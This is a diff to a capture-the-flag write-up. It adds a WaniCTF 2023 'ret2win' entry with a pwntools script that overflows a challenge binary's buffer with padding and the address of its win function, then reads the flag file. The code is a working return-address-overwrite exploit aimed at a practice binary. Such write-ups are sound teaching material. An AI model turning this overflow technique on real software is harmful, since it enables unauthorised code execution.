@@ -253,3 +253,28 @@ while True:
 ```zsh
 curl -s http://localhost/ | grep -o 'FLAG{.*}'
 ```
+
+# pwn
+
+## ret2win
+
+- https://github.com/wani-hackase/wanictf2023-writeup/tree/main/pwn/ret2win
+
+```python
+#!/usr/bin/env python3
+from pwn import ELF, args, context, flat, process, remote
+from pwnlib import gdb
+
+exe = context.binary = ELF("file/chall", checksec=False)
+if args.GDB:
+    io = gdb.debug(exe.path, gdbscript="b main\n c")
+elif args.REMOTE:
+    io = remote("::1", 9003)
+else:
+    io = process(exe.path)
+io.sendlineafter(b" > ", flat(
+    b"A"*0x28,
+    exe.sym.win))
+io.sendline(b"cat FLAG")
+io.stream()
+```
